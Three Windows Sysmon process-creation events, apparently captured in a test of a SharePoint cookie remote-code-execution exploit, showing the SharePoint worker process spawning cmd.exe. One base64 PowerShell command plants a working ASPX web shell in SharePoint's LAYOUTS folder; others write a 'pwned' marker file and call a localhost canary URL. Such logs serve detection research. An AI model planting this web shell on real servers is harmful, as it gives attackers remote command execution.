{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-Sysmon",
          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
        }
      },
      "EventID": 1,
      "Version": 5,
      "Level": 4,
      "Task": 1,
      "Opcode": 0,
      "Keywords": "0x8000000000000000",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2026-07-27T08:34:38.934149Z"
        }
      },
      "EventRecordID": 6940,
      "Correlation": null,
      "Execution": {
        "#attributes": {
          "ProcessID": 9704,
          "ThreadID": 8200
        }
      },
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "EC2AMAZ-L8S04Q1.corp.example.com",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-18"
        }
      }
    },
    "EventData": {
      "RuleName": "-",
      "UtcTime": "2026-07-27 08:34:38.932",
      "ProcessGuid": "359D7290-181E-6A67-E602-00000000BA03",
      "ProcessId": 12968,
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "FileVersion": "10.0.17763.1697 (WinBuild.160101.0800)",
      "Description": "Windows Command Processor",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "Cmd.Exe",
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell.exe -NoProfile -NonInteractive -EncodedCommand WwBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABUAGUAeAB0ACgAJwBDADoAXABQAHIAbwBnAHIAYQBtACAARgBpAGwAZQBzAFwAQwBvAG0AbQBvAG4AIABGAGkAbABlAHMAXABNAGkAYwByAG8AcwBvAGYAdAAgAFMAaABhAHIAZQBkAFwAVwBlAGIAIABTAGUAcgB2AGUAcgAgAEUAeAB0AGUAbgBzAGkAbwBuAHMAXAAxADYAXABUAEUATQBQAEwAQQBUAEUAXABMAEEAWQBPAFUAVABTAFwAcwBoAGUAbABsAC4AYQBzAHAAeAAnACwAJwA8ACUAQAAgAFAAYQBnAGUAIABMAGEAbgBnAHUAYQBnAGUAPQAiAEMAIwAiACAAJQA+ADwAJQBAACAASQBtAHAAbwByAHQAIABOAGEAbQBlAHMAcABhAGMAZQA9ACIAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMAIgAgACUAPgA8ACUAIAB2AGEAcgAgAHAAPQBuAGUAdwAgAFAAcgBvAGMAZQBzAHMAKAApADsAcAAuAFMAdABhAHIAdABJAG4AZgBvAC4ARgBpAGwAZQBOAGEAbQBlAD0AIgBjAG0AZAAuAGUAeABlACIAOwBwAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACIALwBjACAAIgArAFIAZQBxAHUAZQBzAHQAWwAiAGMAIgBdADsAcAAuAFMAdABhAHIAdABJAG4AZgBvAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAPQBmAGEAbABzAGUAOwBwAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AdAByAHUAZQA7AHAALgBTAHQAYQByAHQAKAApADsAUgBlAHMAcABvAG4AcwBlAC4AVwByAGkAdABlACgAcAAuAFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApADsAcAAuAFcAYQBpAHQARgBvAHIARQB4AGkAdAAoACkAOwAgACUAPgAnACkA",
      "CurrentDirectory": "c:\\windows\\system32\\inetsrv\\",
      "User": "corp\\Admin",
      "LogonGuid": "359D7290-EDB3-6A66-A1B6-8C0000000000",
      "LogonId": "0x8cb6a1",
      "TerminalSessionId": 0,
      "IntegrityLevel": "High",
      "Hashes": "MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18",
      "ParentProcessGuid": "359D7290-EDB3-6A66-E101-00000000BA03",
      "ParentProcessId": 8532,
      "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
      "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"SharePoint - 80\" -v \"v4.0\" -l \"webengine4.dll\" -a \\\\.\\pipe\\iisipme58a6732-06aa-4a33-aca6-88322caaee1e -h \"C:\\inetpub\\temp\\apppools\\SharePoint - 80\\SharePoint - 80.config\" -w \"\" -m 0",
      "ParentUser": "corp\\Admin"
    }
  }
}
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-Sysmon",
          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
        }
      },
      "EventID": 1,
      "Version": 5,
      "Level": 4,
      "Task": 1,
      "Opcode": 0,
      "Keywords": "0x8000000000000000",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2026-07-27T08:35:31.386934Z"
        }
      },
      "EventRecordID": 6953,
      "Correlation": null,
      "Execution": {
        "#attributes": {
          "ProcessID": 9704,
          "ThreadID": 8200
        }
      },
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "EC2AMAZ-L8S04Q1.corp.example.com",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-18"
        }
      }
    },
    "EventData": {
      "RuleName": "-",
      "UtcTime": "2026-07-27 08:35:31.385",
      "ProcessGuid": "359D7290-1853-6A67-EA02-00000000BA03",
      "ProcessId": 13200,
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "FileVersion": "10.0.17763.1697 (WinBuild.160101.0800)",
      "Description": "Windows Command Processor",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "Cmd.Exe",
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c cmd.exe /c echo pwned > C:\\pwned.txt",
      "CurrentDirectory": "c:\\windows\\system32\\inetsrv\\",
      "User": "corp\\Admin",
      "LogonGuid": "359D7290-EDB3-6A66-A1B6-8C0000000000",
      "LogonId": "0x8cb6a1",
      "TerminalSessionId": 0,
      "IntegrityLevel": "High",
      "Hashes": "MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18",
      "ParentProcessGuid": "359D7290-EDB3-6A66-E101-00000000BA03",
      "ParentProcessId": 8532,
      "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
      "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"SharePoint - 80\" -v \"v4.0\" -l \"webengine4.dll\" -a \\\\.\\pipe\\iisipme58a6732-06aa-4a33-aca6-88322caaee1e -h \"C:\\inetpub\\temp\\apppools\\SharePoint - 80\\SharePoint - 80.config\" -w \"\" -m 0",
      "ParentUser": "corp\\Admin"
    }
  }
}
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-Sysmon",
          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
        }
      },
      "EventID": 1,
      "Version": 5,
      "Level": 4,
      "Task": 1,
      "Opcode": 0,
      "Keywords": "0x8000000000000000",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2026-07-27T08:37:12.645808Z"
        }
      },
      "EventRecordID": 6965,
      "Correlation": null,
      "Execution": {
        "#attributes": {
          "ProcessID": 9704,
          "ThreadID": 8200
        }
      },
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "EC2AMAZ-L8S04Q1.corp.example.com",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-18"
        }
      }
    },
    "EventData": {
      "RuleName": "-",
      "UtcTime": "2026-07-27 08:37:12.644",
      "ProcessGuid": "359D7290-18B8-6A67-EE02-00000000BA03",
      "ProcessId": 13780,
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "FileVersion": "10.0.17763.1697 (WinBuild.160101.0800)",
      "Description": "Windows Command Processor",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "Cmd.Exe",
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell.exe -NoProfile -NonInteractive -Command Invoke-WebRequest -UseBasicParsing 'http://localhost:8000/spse-cookie-rce-d4cd4dbef42e471eb6a2dc2dcd07abd4'",
      "CurrentDirectory": "c:\\windows\\system32\\inetsrv\\",
      "User": "corp\\Admin",
      "LogonGuid": "359D7290-EDB3-6A66-A1B6-8C0000000000",
      "LogonId": "0x8cb6a1",
      "TerminalSessionId": 0,
      "IntegrityLevel": "High",
      "Hashes": "MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18",
      "ParentProcessGuid": "359D7290-EDB3-6A66-E101-00000000BA03",
      "ParentProcessId": 8532,
      "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
      "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"SharePoint - 80\" -v \"v4.0\" -l \"webengine4.dll\" -a \\\\.\\pipe\\iisipme58a6732-06aa-4a33-aca6-88322caaee1e -h \"C:\\inetpub\\temp\\apppools\\SharePoint - 80\\SharePoint - 80.config\" -w \"\" -m 0",
      "ParentUser": "corp\\Admin"
    }
  }
}
